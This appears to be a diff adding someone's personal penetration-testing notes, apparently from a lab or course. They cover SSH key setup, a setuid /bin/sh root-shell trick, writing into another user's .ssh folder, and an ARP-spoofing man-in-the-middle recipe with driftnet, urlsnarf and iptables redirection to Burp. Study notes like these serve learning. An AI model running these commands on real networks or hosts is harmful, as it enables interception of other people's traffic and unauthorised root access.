@@ -1,0 +1,31 @@
+linux ssh key
+ssh-keygen
+ls /root/.ssh
+cat /root/.ssh/id_rsa.pub
+copy to  /root/.ssh/authorized_keys on other host
+used the setuid bit on /bin/sh to get a root shell, with ./sh -p
+
+sudo -u trinity /bin/cp test /home/trinity/.ssh/test.txt
+
+mitm
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+or
+sysctl -w net.ipv4.ip_forward=1
+
+separate terminals
+arpspoof -i tap0 -t <target> <gw>
+arpspoof -i tap0 -t <gw> <target>
+
+use wireshark to check traffic
+
+driftnet -i tap0
+urlsnarf -i tap0
+
+disable forwarding when done
+sysctl -w net.ipv4.ip_forward=0
+
+if using burp
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
